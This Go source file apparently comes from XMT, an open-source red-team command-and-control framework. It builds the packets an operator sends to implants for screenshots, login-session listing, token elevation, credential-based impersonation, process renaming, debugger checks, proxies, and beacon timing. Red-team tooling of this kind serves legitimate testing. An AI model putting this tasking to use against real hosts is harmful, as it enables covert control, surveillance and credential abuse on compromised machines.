//go:build !implant

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"time"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
)

// Pwd returns a print current directory Packet. This can be used to instruct
// the client to return a string value that contains the current working
// directory.
//
// C2 Details:
//  ID: MvPwd
//
//  Input:
//      <none>
//  Output:
//      string // Working Dir
func Pwd() *com.Packet {
	return &com.Packet{ID: MvPwd}
}

// Mounts returns a list mounted drives Packet. This can be used to instruct
// the client to return a string list of all the mount points on the host device.
//
// C2 Details:
//  ID: MvMounts
//
//  Input:
//      <none>
//  Output:
//      []string // Mount Paths List
func Mounts() *com.Packet {
	return &com.Packet{ID: MvMounts}
}

// Refresh returns a refresh Packet. This will instruct the client to re-update
// it's internal Device storage and return the new result. This can be used to
// detect new network interfaces added/removed and changes to hostname/user
// status.
//
// This is NOT needed after a Migration, as this happens automatically.
//
// C2 Details:
//  ID: MvRefresh
//
//  Input:
//      <none>
//  Output:
//      Machine // Updated device details
func Refresh() *com.Packet {
	return &com.Packet{ID: MvRefresh}
}

// RevToSelf returns a Rev2Self Packet. This can be used to instruct Windows
// based devices to drop any previous elevated Tokens they may possess and return
// to their "normal" Token.
//
// This task result does not return any data, only errors if it fails.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvRevSelf
//
//  Input:
//      <none>
//  Output:
//      <none>
func RevToSelf() *com.Packet {
	return &com.Packet{ID: TvRevSelf}
}

// UserLogins returns a current Login sessions Packet. This will instruct the
// client to reterive a list of the current login sessions on the device.
//
// C2 Details:
//  ID: TvLogins
//
//  Input:
//      <none>
//  Output:
//      uint32               // Count
//      []Login struct {     // List of Logins
//          uint32           // Session ID
//          uint8            // Login Status
//          int64            // Login Time
//          int64            // Last Idle Time
//          Address struct { // From Address
//              uint64       // High bits of Address
//              uint64       // Low bits of Address
//          }
//          string           // Username
//          string           // Hostname
//      }
func UserLogins() *com.Packet {
	return &com.Packet{ID: TvLogins}
}

// ScreenShot returns a screenshot Packet. This will instruct the client to
// attempt to get a screenshot of all the current active desktops on the host.
// If successful, the returned data is a binary blob of the resulting image,
// encoded in the PNG image format.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TVScreenShot
//
//  Input:
//      <none>
//  Output:
//      []byte // Data
func ScreenShot() *com.Packet {
	return &com.Packet{ID: TvScreenShot}
}

// Ls returns a file list Packet. This can be used to instruct the client
// to return a string and bool list of the files in the directory specified.
//
// If 'd' is empty, the current working directory "." is used.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: MvList
//
//  Input:
//      string          // Directory
//  Output:
//      uint32          // Count
//      []File struct { // List of Files
//          string      // Name
//          int32       // Mode
//          uint64      // Size
//          int64       // Modtime
//      }
func Ls(d string) *com.Packet {
	n := &com.Packet{ID: MvList}
	n.WriteString(d)
	return n
}

// IsDebugged returns a check debugger status Packet. This can be used to instruct
// the client to return a boolean value determine if it is currently attached or
// being run by a debugger.
//
// C2 Details:
//  ID: MvCheckDebug
//
//  Input:
//      <none>
//  Output:
//      bool // True if being debugged, false otherwise
func IsDebugged() *com.Packet {
	return &com.Packet{ID: MvCheckDebug}
}

// Jitter returns a set Session jitter Packet. This can be used to instruct the
// client to update it's jitter value to the specified 0-100 percentage.
//
// Anything greater than 100 will be capped to 100 and anything less than zero
// (except -1) will be set to zero. Values of -1 are ignored. This setting will
// NOT override the Sleep setting.
//
// C2 Details:
//  ID: MvTime
//
//  Input:
//      uint8       // Always 0 for this Task
//      int8        // Jitter
//      uint64      // Always 0 for this Task
//  Output:
//      uint8       // Jitter
//      uint64      // Sleep
//      uint64      // Kill Date
//      WorkHours { // Work Hours
//          uint8   // Day
//          uint8   // Start Hour
//          uint8   // Start Min
//          uint8   // End Hour
//          uint8   // End Min
//      }
func Jitter(j int) *com.Packet {
	return Duration(0, j)
}

// Cwd returns a change directory Packet. This can be used to instruct the
// client to change from its current working directory to the directory
// specified.
//
// Empty or invalid directory entries will return an error.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: MvCwd
//
//  Input:
//      string // Directory
//  Output:
//      <none>
func Cwd(d string) *com.Packet {
	n := &com.Packet{ID: MvCwd}
	n.WriteString(d)
	return n
}

// Profile returns an update profile Packet. This can be used to instruct the
// client to set its profile to the raw Profile bytes supplied.
//
// IT IS RECOMMENDED TO USE THE 'Session.SetProfile' CALL INSTEAD TO PREVENT DE-SYNC
// ISSUES BETWEEN SERVER AND CLIENT. HERE ONLY FOR USAGE IN SCRIPTS.
//
// C2 Details:
//  ID: MvProfile
//
//  Input:
//      []byte // Profile
//  Output:
//      <none>
func Profile(b []byte) *com.Packet {
	n := &com.Packet{ID: MvProfile}
	n.WriteBytes(b)
	return n
}

// KillDate returns a set Session kill date Packet. This can be used to instruct
// the client to update it's kill date to the specified date value.
//
// If the time supplied is the empty time struct, this will clear any Kill Date
// if it exists.
//
// C2 Details:
//  ID: MvTime
//
//  Input:
//      uint8       // Always 1 for this Task
//      uint64      // Unix time
//  Output:
//      uint8       // Jitter
//      uint64      // Sleep
//      uint64      // Kill Date
//      WorkHours { // Work Hours
//          uint8   // Day
//          uint8   // Start Hour
//          uint8   // Start Min
//          uint8   // End Hour
//          uint8   // End Min
//      }
func KillDate(t time.Time) *com.Packet {
	n := &com.Packet{ID: MvTime}
	if n.WriteUint8(1); t.IsZero() {
		n.WriteUint64(0)
	} else {
		n.WriteInt64(t.Unix())
	}
	return n
}

// ProcessName returns a process name change Packet. This can be used to instruct
// the client to change from its current in-memory name to the specified string.
//
// C2 Details:
//  ID: TvRename
//
//  Input:
//      string // New Process Name
//  Output:
//      <none>
func ProcessName(s string) *com.Packet {
	n := &com.Packet{ID: TvRename}
	n.WriteString(s)
	return n
}

// Wait returns a wait -n- sleep Packet. This can be used to instruct to the
// client to pause processing for the specified duration.
//
// This Task only has an affect during Scripts as most operations are threaded.
//
// If the time is less than or equal to zero, the task will become a NOP.
//
// C2 Details:
//  ID: TvWait
//
//  Input:
//      uint64 // Wait duration
//  Output:
//      <none>
func Wait(d time.Duration) *com.Packet {
	n := &com.Packet{ID: TvWait}
	n.WriteUint64(uint64(d))
	return n
}

// UserLogoff returns a logoff user session Packet. This will instruct the client
// to logoff the targeted user session via ID (or -1 for the current session).
//
// C2 Details:
//  ID: TvLoginsAct
//
//  Input:
//      uint8 // Always set to 1 for this task.
//      int32 // Session ID
//  Output:
//      <none>
func UserLogoff(sid int32) *com.Packet {
	n := &com.Packet{ID: TvLoginsAct}
	n.WriteUint8(taskLoginsLogoff)
	n.WriteInt32(sid)
	return n
}

// Sleep returns a set Session sleep Packet. This can be used to instruct the
// client to update it's sleep value to the specified duration.
//
// Anything less than or equal to zero is ignored! This setting will NOT override
// the Jitter setting.
//
// C2 Details:
//  ID: MvTime
//
//  Input:
//      uint8       // Always 0 for this Task
//      int8        // Always -1 for this Task
//      uint64      // Sleep
//  Output:
//      uint8       // Jitter
//      uint64      // Sleep
//      uint64      // Kill Date
//      WorkHours { // Work Hours
//          uint8   // Day
//          uint8   // Start Hour
//          uint8   // Start Min
//          uint8   // End Hour
//          uint8   // End Min
//      }
func Sleep(d time.Duration) *com.Packet {
	return Duration(d, -1)
}

// ProxyRemove returns a remove Proxy Packet. This can be used to instruct the
// client to attempt to remove the Proxy setup by the name, or the single Proxy
// instance (if multi-proxy mode is disabled).
//
// Returns an NotFound error if the Proxy is not registered or Proxy support is
// disabled
//
// C2 Details:
//  ID: MvProxy
//
//  Input:
//      string // Proxy Name (may be empty)
//      uint8  // Always set to true for this task.
//  Output:
//      <none>
func ProxyRemove(name string) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(0)
	return n
}

// UserProcesses returns a list processes Packet. This can be used to instruct
// the client to return a list of the current running host's processes under the
// specified Session ID (or -1/0 for all session processes).
//
// C2 Details:
//  ID: TvLoginsProc
//
//  Input:
//      <none>
//  Output:
//      uint32          // Count
//      []ProcessInfo { // List of Running Processes
//          uint32      // Process ID
//          uint32      // _
//          string      // Process Image Name
//      }
func UserProcesses(sid int32) *com.Packet {
	n := &com.Packet{ID: TvLoginsProc}
	n.WriteInt32(sid)
	return n
}

// UnTrust returns an Untrust Packet. This will instruct the client to use the
// provided Filter to attempt to "Untrust" the targeted process by removing all
// of its permissions and setting its integrity level to "Untrusted".
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvUnTrust
//
//  Input:
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      <none>
func UnTrust(f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvUnTrust}
	f.MarshalStream(n)
	return n
}

// Elevate returns an elevate Packet. This will instruct the client to use the
// provided Filter to attempt to get a Token handle to an elevated process. If
// the Filter is nil, then the client will attempt at any elevated process.
//
// Always returns 'ErrNoWindows' on non-Windows devices.
//
// C2 Details:
//  ID: TvElevate
//
//  Input:
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      <none>
func Elevate(f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvElevate}
	f.MarshalStream(n)
	return n
}

// UserDisconnect returns a disconnect user session Packet. This will instruct the
// client to disconnect the targeted user session via ID (or -1 for the current
// session).
//
// C2 Details:
//  ID: TvLoginsAct
//
//  Input:
//      uint8 // Always set to 0 for this task.
//      int32 // Session ID
//  Output:
//      <none>
func UserDisconnect(sid int32) *com.Packet {
	n := &com.Packet{ID: TvLoginsAct}
	n.WriteUint8(taskLoginsDisconnect)
	n.WriteInt32(sid)
	return n
}

// Duration returns a set Session sleep and/or jitter Packet. This can be used
// to instruct the client to update it's sleep and jitters value to the specified
// duration and 0-100 percentage values if they are not unset. (-1 for Jitter,
// anything <=0 for Sleep).
//
// For Sleep, anything less than or equal to zero is ignored!
//
// For Jitter, anything greater than 100 will be capped to 100 and anything less
// than zero (except -1) will be set to zero. Values of -1 are ignored.
//
// C2 Details:
//  ID: MvTime
//
//  Input:
//      uint8       // Always 0 for this Task
//      int8        // Jitter
//      uint64      // Sleep
//  Output:
//      uint8       // Jitter
//      uint64      // Sleep
//      uint64      // Kill Date
//      WorkHours { // Work Hours
//          uint8   // Day
//          uint8   // Start Hour
//          uint8   // Start Min
//          uint8   // End Hour
//          uint8   // End Min
//      }
func Duration(d time.Duration, j int) *com.Packet {
	n := &com.Packet{ID: MvTime}
	n.WriteUint16(uint16(j & 0xFF))
	n.WriteUint64(uint64(d))
	return n
}

// Proxy returns an add Proxy Packet. This can be used to instruct the client to
// attempt to add the specified Proxy with the name, bind address and Profile
// bytes.
//
// Returns an error if Proxy support is disabled, a listen/setup error occurs or
// the name already is in use.
//
// C2 Details:
//  ID: MvProxy
//
//  Input:
//      string // Proxy Name (may be empty)
//      uint8  // Always set to false for this task.
//      string // Proxy Bind Address
//      []byte // Proxy Profile
//  Output:
//      <none>
func Proxy(name, addr string, p []byte) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(2)
	n.WriteString(addr)
	n.WriteBytes(p)
	return n
}

// ProxyReplace returns a replace Proxy Packet. This can be used to instruct
// the client to attempt to call the 'Replace' function on the specified Proxy
// with the name, bind address and Profile bytes as the arguments.
//
// Returns an error if Proxy support is disabled, a listen/setup error occurs or
// the name already is in use.
//
// C2 Details:
//  ID: MvProxy
//
//  Input:
//      string // Proxy Name (may be empty)
//      uint8  // Always set to false for this task.
//      string // Proxy Bind Address
//      []byte // Proxy Profile
//  Output:
//      <none>
func ProxyReplace(name, addr string, p []byte) *com.Packet {
	n := &com.Packet{ID: MvProxy}
	n.WriteString(name)
	n.WriteUint8(1)
	n.WriteString(addr)
	n.WriteBytes(p)
	return n
}

// LoginUser returns an impersonate user Packet. This will instruct the client to
// use the provided credentials to change it's Token to the user that owns the
// supplied credentials.
//
// If the interactive boolen at the start is true, the client will do an interactive
// login instead. This allows for more access and will change the username, but
// may prevent access to network resources.
//
// Always returns 'ErrNoWindows' on non-Windows devices. (for now).
//
// C2 Details:
//  ID: TvLoginUser
//
//  Input:
//      bool   // Interactive
//      string // Username
//      string // Domain
//      string // Password
//  Output:
//      <none>
func LoginUser(interactive bool, user, domain, pass string) *com.Packet {
	n := &com.Packet{ID: TvLoginUser}
	n.WriteBool(interactive)
	n.WriteString(user)
	n.WriteString(domain)
	n.WriteString(pass)
	return n
}

// WorkHours returns a set Session Work Hours Packet. This can be used to instruct
// the client to update it's working hours to the supplied work hours values as
// uint8 values.
//
// Days is a bitmask of the days that the WorkHours applies to The bit values are
// 0 (Sunday) to 7 (Saturday). Values 0, 255 and anything over 126 are treated
// as all days selected.
//
// If all the supplied values are zero, this will clear any previous Work Hours
// set.
//
// C2 Details:
//  ID: MvTime
//
//  Input:
//      uint8       // Always 2 for this Task
//      uint64      // Unix time
//  Output:
//      uint8       // Jitter
//      uint64      // Sleep
//      uint64      // Kill Date
//      WorkHours { // Work Hours
//          uint8   // Day
//          uint8   // Start Hour
//          uint8   // Start Min
//          uint8   // End Hour
//          uint8   // End Min
//      }
func WorkHours(day, startHour, startMin, endHour, endMin uint8) *com.Packet {
	n := &com.Packet{ID: MvTime}
	n.WriteUint16(0x200 | uint16(day&0xFF))
	n.WriteUint8(startHour)
	n.WriteUint8(startMin)
	n.WriteUint8(endHour)
	n.WriteUint8(endMin)
	return n
}
